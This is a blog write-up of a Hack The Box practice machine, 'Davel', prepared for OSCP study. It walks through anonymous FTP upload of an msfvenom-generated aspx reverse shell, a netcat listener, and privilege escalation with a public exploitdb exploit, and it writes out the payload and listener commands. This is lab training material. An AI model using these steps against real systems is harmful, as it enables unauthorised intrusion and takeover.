---
layout: post
title:  "HTB - DAVEL - Without Metasploit"
date:   2020-02-11 08:07:19
categories: [HTB,Writeup,oscp-prep]
comments: true
image:
  feature: ![infocard](infocard.png)
---

Davel is one of the easy windows OSCP like machine. The full list of OSCP like machine can be found [here](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)

Let's get started!

<!--more-->

### Recon
 
Started with [nmapAutomater](https://github.com/21y4d/nmapAutomator) for recon and found FTP port open with anonymous access.

![nmap-result](nmap-allowed-anonymous.png)

The machine also has port 80 open which looks like default IIS page.

![http-site](../img/screenshot/http-site.png)

Whatever uploaded in the FTP can be accessed from HTTP.

### Exploitation

Creating aspx reverse shell using msfvenom.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.80 LPORT=4242 -f aspx > shell.aspx`

Uploading the aspx file to the ftp

![uploading shell](uploading-shell-anonymous-ftp.png)

Accessing the shell from the HTTP to get the reverse tcp connection. Spawn the listener in attacker machine

`nc -nlvp 4242`

Got shell. But the user was IIS user and dosent have user or admin privilege.

### Privilege escalation

![windows shell system info](windows_shell_systeminfo.png)

From the system info we can understand the following:
1. Os Name : Windows 7 enterprise 
2. Os version : 6.1.7600
3. Hotfix : Not applied


Googled the OS name and its version for corresponding CVE and found a exploit on exploitdb.

![priv-exec](priv-esc-exploitdb.png)

Use `searchsploit` to copy the exploit locally.

![searchsploit](searchsploit.png)

Method to build the exe is given in the comment section of the exploit

![how to build](how-to-build.png)

Compiling the exe file and creating python shell to transfer the exe file.

![compiling](compiling%20and%20executing%20binary.png)

Using powershell, Downloading the exe file to the victim machine.

![powershell to donwload the file](Download-files-in-windows.png)

Executing the exe file

![priv exec](executing-shell-gaining-system-priv.png)

##### Owning User

![owning user](owning-user.png)

##### Owning Administrator
![owning root](owning-root.png)


### Cleanup

1. Deleting aspx shell from FTP

![ftp-cleanup](cleanup-ftp.png)

2. Deleted privexec exe from the machine




